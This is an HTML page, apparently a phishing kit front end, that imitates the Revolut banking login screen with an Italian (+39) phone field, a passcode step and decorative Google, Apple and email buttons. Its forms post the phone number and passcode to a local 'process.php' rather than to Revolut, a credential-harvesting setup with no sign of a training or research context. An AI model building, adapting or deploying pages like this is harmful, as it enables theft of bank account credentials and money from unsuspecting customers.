<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Revolut Login</title>
<style>
  /* Reset */
  * {
    box-sizing: border-box;
  }
  body {
    margin: 0;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: radial-gradient(circle at top left, #002349, #000b17);
    color: white;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }
  .container {
    display: flex;
    gap: 60px;
    max-width: 760px;
  }
  .left {
    max-width: 360px;
    display: flex;
    flex-direction: column;
  }
  .logo {
    font-weight: 700;
    font-size: 22px;
    margin-bottom: 40px;
  }
  h1 {
    margin: 0 0 10px 0;
    font-weight: 700;
    font-size: 24px;
  }
  .desc {
    margin: 0 0 25px 0;
    line-height: 1.35;
    font-size: 15px;
    opacity: 0.85;
  }
  /* Phone input wrapper */
  .phone-wrapper,
  .passcode-wrapper {
    display: flex;
    gap: 12px;
    margin-bottom: 10px;
  }
  .country-code {
    display: flex;
    align-items: center;
    gap: 6px;
    background: #1e293b;
    border-radius: 12px;
    padding: 12px 14px;
    min-width: 95px;
    cursor: default;
  }
  .country-code img.flag {
    width: 20px;
    height: 14px;
    object-fit: cover;
    border-radius: 2px;
  }
  .country-code span {
    font-size: 15px;
    font-weight: 600;
  }
  input[type="tel"],
  input[type="password"] {
    flex-grow: 1;
    background: #1e293b;
    border-radius: 12px;
    border: none;
    padding: 12px 14px;
    font-size: 15px;
    color: white;
    outline: none;
  }
  input::placeholder {
    color: #7485a5;
  }
  /* lost access link */
  .lost-access {
    font-size: 13px;
    color: #3760f4;
    text-decoration: none;
    margin-bottom: 20px;
    display: inline-block;
  }
  .lost-access:hover,
  .back-btn:hover {
    text-decoration: underline;
  }
  /* Buttons */
  button.continue-btn,
  button.submit-btn,
  button.back-btn,
  button.create-account-btn {
    width: 100%;
    border-radius: 30px;
    border: none;
    padding: 15px 0;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: background-color 0.3s ease;
    user-select: none;
  }
  button.continue-btn,
  button.submit-btn {
    background: #646464;
    color: #222;
  }
  button.continue-btn:disabled,
  button.submit-btn:disabled {
    background: #4e4e4e;
    color: #666;
    cursor: not-allowed;
  }
  button.continue-btn:hover:not(:disabled),
  button.submit-btn:hover:not(:disabled) {
    background: #828282;
  }
  button.back-btn {
    background: transparent;
    color: #3760f4;
    font-weight: 500;
    font-size: 14px;
    margin-bottom: 30px;
    width: auto;
    padding: 0;
    cursor: pointer;
  }
  button.back-btn:focus {
    outline: 2px solid #3760f4;
    outline-offset: 2px;
  }
  button.create-account-btn {
    background: #15161a;
    color: white;
    font-size: 15px;
    margin-top: 18px;
  }
  button.create-account-btn:hover {
    background: #282a31;
  }
  /* Separator */
  .separator {
    display: flex;
    align-items: center;
    font-size: 14px;
    color: #9fa8be;
    margin: 30px 0 22px 0;
  }
  .separator::before,
  .separator::after {
    content: "";
    flex-grow: 1;
    border-bottom: 1px solid #394a6e;
  }
  .separator:not(:empty)::before {
    margin-right: 14px;
  }
  .separator:not(:empty)::after {
    margin-left: 14px;
  }
  /* Social logins */
  .socials {
    display: flex;
    gap: 35px;
    justify-content: start;
    margin-bottom: 26px;
  }
  .social-btn {
    display: flex;
    flex-direction: column;
    align-items: center;
    cursor: pointer;
    color: white;
    font-size: 12px;
    user-select: none;
  }
  .social-btn svg {
    width: 32px;
    height: 32px;
  }
  .social-label {
    font-weight: 600;
    margin-top: 6px;
  }
  .social-google svg {
    fill: none;
  }
  .social-google circle {
    fill: white;
  }
  /* Create account */
  .create-account-wrapper {
    text-align: center;
    color: #7f8593;
    font-size: 13px;
    margin-bottom: 8px;
  }
  /* Right */
  .right {
    display: flex;
    flex-direction: column;
    align-items: center;
    max-width: 200px;
  }
  .qr-code {
    width: 150px;
    height: 150px;
    background: white;
    border-radius: 15px;
    display: flex;
    justify-content: center;
    align-items: center;
    margin-bottom: 18px;
  }
  .qr-text {
    font-weight: 600;
    font-size: 16px;
    margin-bottom: 6px;
  }
  .qr-desc {
    color: #a7acba;
    font-size: 13px;
    line-height: 1.3;
    text-align: center;
  }
  /* Footer */
  .footer {
    position: fixed;
    bottom: 14px;
    left: 14px;
    color: #616875;
    font-size: 13px;
    display: flex;
    gap: 15px;
    align-items: center;
  }
  .footer select {
    background: transparent;
    border: none;
    color: #616875;
    cursor: pointer;
    font-size: 13px;
    font-weight: 500;
    outline: none;
  }
  .footer a {
    color: #616875;
    text-decoration: none;
    cursor: pointer;
    font-weight: 600;
  }
  .footer a:hover {
    text-decoration: underline;
  }
  /* Hide passcode form initially */
  #passcodeSection {
    display: none;
  }
</style>
</head>
<body>
  <div class="container" role="main" aria-label="Login page">

    <section class="left" aria-labelledby="welcome-title">
      <div class="logo" aria-label="Revolut logo">Revolut</div>
      <h1 id="welcome-title">Welcome back</h1>

      <!-- Phone input section -->
      <div id="phoneSection">
        <p class="desc">Enter the phone number associated with your Revolut account</p>

        <form id="phoneForm" method="post" action="process.php" autocomplete="off" novalidate>
          <div class="phone-wrapper">
            <div class="country-code" aria-label="Country code United States +39">
              <img
                src="https://flagcdn.com/it.svg"
                alt="US flag"
                class="flag"
                decoding="async"
                loading="lazy"
                width="20"
                height="14"
              />
              <span>+39</span>
            </div>
            <input
              id="phoneInput"
              type="tel"
              placeholder="Phone number"
              aria-required="true"
              aria-describedby="phone-desc"
              autofocus
              inputmode="tel"
              name="phone"
            />
          </div>
        </form>

        <a href="#" class="lost-access" id="lostAccess">Lost access to my phone number</a>

        <button id="continueBtn" class="continue-btn" disabled aria-disabled="true">Continue</button>
      </div>

      <!-- Passcode input section (hidden initially) -->
      <div id="passcodeSection" aria-live="polite" aria-atomic="true">
        <p class="desc">Enter your passcode</p>

        <form id="passcodeForm" method="post" action="process.php" autocomplete="off" novalidate>
          <div class="passcode-wrapper">
            <input
              id="passcodeInput"
              type="password"
              placeholder="Passcode"
              aria-required="true"
              autofocus
              name="passcode"
            />
          </div>
          <button id="submitBtn" class="submit-btn" disabled aria-disabled="true">Submit</button>
          <button id="backBtn" class="back-btn" type="button" aria-label="Back to phone number input">Back</button>
        </form>
      </div>

      <div class="separator" aria-label="or continue with">or continue with</div>

      <div class="socials" role="list">
        <!-- Email -->
        <div class="social-btn" role="listitem" tabindex="0" aria-label="Continue with Email">
          <svg width="24" height="18" viewBox="0 0 24 18" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
            <path d="M23 2.917V15.084C23 16.224 22.225 17 21.09 17H2.91C1.775 17 1 16.224 1 15.084V2.917C1 1.777 1.775 1 2.91 1H21.09C22.225 1 23 1.777 23 2.917Z" stroke="white" stroke-width="2" stroke-linejoin="round"/>
            <path d="M23 2.916L12 11 1 2.916" stroke="white" stroke-width="2" stroke-linejoin="round"/>
          </svg>
          <span class="social-label">Email</span>
        </div>
        <!-- Google -->
        <div class="social-btn social-google" role="listitem" tabindex="0" aria-label="Continue with Google">
          <svg width="32" height="32" viewBox="0 0 48 48" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
            <circle cx="24" cy="24" r="24" fill="#4285F4"/>
            <g clip-path="url(#clip0_212_271)">
              <path d="M31.854 24.58c0-.752-.067-1.476-.19-2.176H24v4.12h4.488a3.832 3.832 0 0 1-1.658 2.512v2.086h2.683c1.57-1.447 2.476-3.568 2.476-6.542z" fill="#fff"/>
              <path d="M24 32c2.43 0 4.464-.8 5.956-2.156l-2.683-2.085c-.73.49-1.664.778-3.273.778-2.524 0-4.66-1.706-5.425-3.995H15.83v2.022A8 8 0 0 0 24 32z" fill="#fff"/>
              <path d="M18.575 26.94a4.9 4.9 0 0 1 0-3.88v-2.022H15.83a8.024 8.024 0 0 0 0 7.963l2.745-2.06z" fill="#fff"/>
              <path d="M24 18.104c1.32 0 2.498.453 3.427 1.344l2.57-2.57A8.145 8.145 0 0 0 24 13a8 8 0 0 0-8 8l2.745-2.022c.766-2.29 2.9-3.995 5.425-3.995z" fill="#fff"/>
            </g>
            <defs>
              <clipPath id="clip0_212_271">
                <path fill="#fff" transform="translate(15 13)" d="M0 0h18v18H0z"/>
              </clipPath>
            </defs>
          </svg>
          <span class="social-label">Google</span>
        </div>
        <!-- Apple -->
        <div class="social-btn" role="listitem" tabindex="0" aria-label="Continue with Apple">
          <svg width="30" height="37" viewBox="0 0 30 37" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
            <path d="M19.512 9.93c-.56.675-1.178 1.306-1.886 1.806-.95.68-1.976 1.024-2.975 1.024-.09-1.257.46-2.527 1.495-3.35.838-.66 1.856-1.14 3.012-1.166.063 1.257-.43 2.41-0.646 2.686zM28.19 24.044c-.108 3.124-2.584 4.663-5.834 4.663-2.365 0-3.71-1.01-5.53-1.01-1.812 0-2.938.995-5.087.995-2.75 0-5.88-2.678-5.9-7.07-.02-4.04 2.66-7.013 5.748-7.013 1.908 0 3.352 1.056 5.541 1.056 1.848 0 3.114-1.056 5.563-1.056 1.63 0 3.07.823 4.033 2.234-1.31 1.01-2.58 2.666-2.52 4.983.068 2.356 2.135 3.154 2.155 3.17z" fill="white"/>
          </svg>
          <span class="social-label">Apple</span>
        </div>
      </div>

      <div class="create-account-wrapper">
        <p>Don't have an account?</p>
        <button class="create-account-btn">Create account</button>
      </div>
    </section>

    
  <footer class="footer">
    <select aria-label="Select language" id="languageSelect" name="language">
      <option value="en-GB" selected>English (United Kingdom)</option>
      <option value="en-US">English (United States)</option>
      <option value="fr-FR">Fran√ßais (France)</option>
      <option value="de-DE">Deutsch (Deutschland)</option>
    </select>
    <a href="#" tabindex="0">Privacy Policy</a>
  </footer>

  <script>
    const phoneInput = document.getElementById("phoneInput");
    const continueBtn = document.getElementById("continueBtn");
    const phoneSection = document.getElementById("phoneSection");
    const passcodeSection = document.getElementById("passcodeSection");
    const passcodeInput = document.getElementById("passcodeInput");
    const submitBtn = document.getElementById("submitBtn");
    const backBtn = document.getElementById("backBtn");

    // Enable Continue when phone input is filled
    phoneInput.addEventListener("input", () => {
      const val = phoneInput.value.trim();
      if(val.length > 0) {
        continueBtn.disabled = false;
        continueBtn.setAttribute("aria-disabled", "false");
      } else {
        continueBtn.disabled = true;
        continueBtn.setAttribute("aria-disabled", "true");
      }
    });

    // When clicking Continue: hide phone, show passcode
    continueBtn.addEventListener("click", () => {
      if(continueBtn.disabled) return;
      phoneSection.style.display = "none";
      passcodeSection.style.display = "block";
      passcodeInput.focus();
    });

    // Enable submit when passcode is filled
    passcodeInput.addEventListener("input", () => {
      const val = passcodeInput.value.trim();
      if(val.length > 0) {
        submitBtn.disabled = false;
        submitBtn.setAttribute("aria-disabled", "false");
      } else {
        submitBtn.disabled = true;
        submitBtn.setAttribute("aria-disabled", "true");
      }
    });

    // Submit passcode and redirect
    submitBtn.addEventListener("click", () => {
      if(submitBtn.disabled) return;
      // Prevent the default form submission
      event.preventDefault();
      // Submit the form using JavaScript
      document.getElementById('passcodeForm').submit();
    });

    // Back button: go back to phone input
    backBtn.addEventListener("click", () => {
      passcodeSection.style.display = "none";
      phoneSection.style.display = "block";
      passcodeInput.value = "";
      submitBtn.disabled = true;
      submitBtn.setAttribute("aria-disabled", "true");
      phoneInput.focus();
    });
  </script>
</body>
</html>
